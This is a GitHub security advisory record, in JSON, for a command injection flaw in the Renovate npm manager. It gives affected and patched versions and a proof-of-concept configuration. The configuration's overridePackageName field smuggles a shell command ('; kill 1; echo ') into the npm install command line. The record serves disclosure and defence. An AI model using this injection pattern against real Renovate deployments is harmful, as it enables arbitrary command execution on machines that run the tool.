{
  "Severity": "MODERATE",
  "UpdatedAt": "2026-01-13T20:28:17Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "renovate"
  },
  "Advisory": {
    "DatabaseId": 331902,
    "Id": "GSA_kwCzR0hTQS1mcjRqLTY1cHYtZ2pqas4ABRB-",
    "GhsaId": "GHSA-fr4j-65pv-gjjj",
    "References": [
      {
        "Url": "https://github.com/renovatebot/renovate/security/advisories/GHSA-fr4j-65pv-gjjj"
      },
      {
        "Url": "https://github.com/advisories/GHSA-fr4j-65pv-gjjj"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-fr4j-65pv-gjjj"
      }
    ],
    "Description": "### Summary\nThe user-provided string `packageName` in the `npm` manager is appended to the `npm install` command during lock maintenance without proper sanitization.\n\n\n### Details\nAdversaries can provide a maliciously crafted Renovate configuration file to trick Renovate to execute arbitrary code.\nThe user-provided workspace names and package keys that are added to the `updateCmd` variables in [lib/modules/manager/npm/post-update/npm.ts](https://github.com/renovatebot/renovate/blob/5bdaf47eebde770107017c47557bca41189db588/lib/modules/manager/npm/post-update/npm.ts) are not being escaped using the `quote` function from the `shlex` package.\nThis lack of proper sanitization has been present in the product since version 35.63.0 (https://github.com/renovatebot/renovate/commit/012c0ac2fe32832e60a62bde405c0a241efd314c), released on April 27 of 2023.\n\n### PoC\n1. Create a git repo with the following content:\n\n`renovate.json5`:\n\n```json5\n{\n  $schema: \"https://docs.renovatebot.com/renovate-schema.json\",\n  customDatasources: {\n    always: {\n      defaultRegistryUrlTemplate: \"https://docs.renovatebot.com/search/search_index.json\",\n      transformTemplates: ['{\"releases\":[{\"version\":\"11.1.0\"}]}'],\n    },\n  },\n  packageRules: [\n    {\n      // Target of the day\n      matchManagers: [\"npm\"],\n      // Provide a command in the package name\n      overridePackageName: \"; kill 1; echo \",\n      // Override the datasource to prevent a lookup failure\n      overrideDatasource: \"custom.always\",\n    },\n  ],\n}\n\n```\n\n\n`package.json`:\n\n```json\n{\n  \"name\": \"renovate-aci-4\",\n  \"version\": \"0.0.1\",\n  \"dependencies\": {\n    \"uuid\": \"^11.0.0\"\n  }\n}\n```\n\n\n`package-lock.json`:\n\n```json\n{\n  \"name\": \"renovate-aci-4\",\n  \"version\": \"0.0.1\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"name\": \"renovate-aci-4\",\n      \"version\": \"0.0.1\",\n      \"dependencies\": {\n        \"uuid\": \"^11.0.0\"\n      }\n    },\n    \"node_modules/uuid\": {\n      \"version\": \"11.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/uuid/-/uuid-11.0.0.tgz\",\n      \"integrity\": \"sha512-iE8Fa5fgBY4rN5GvNUJ8TSwO1QG7TzdPfhrJczf6XJ6mZUxh/GX433N70fCiJL9h8EKP5ayEIo0Q6EBQGWHFqA==\",\n      \"funding\": [\n        \"https://github.com/sponsors/broofa\",\n        \"https://github.com/sponsors/ctavan\"\n      ],\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"uuid\": \"dist/esm/bin/uuid\"\n      }\n    }\n  }\n}\n\n```\n\n2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting \"Repository finished\", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.\n\n\u003e [!NOTE]\n\u003e This specific proof of concept relies on the introduction of the `overrideDatasource` and `overridePackageName` configuration, available since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024.\n\n### Impact\nThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-01-13T20:28:16Z",
    "Severity": "MODERATE",
    "Summary": "Renovate vulnerable to arbitrary command injection via npm manager and malicious Renovate configuration",
    "UpdatedAt": "2026-01-13T20:28:17Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 6.7,
      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "40.33.0"
      },
      "VulnerableVersionRange": "\u003e= 35.63.0, \u003c 40.33.0"
    }
  ]
}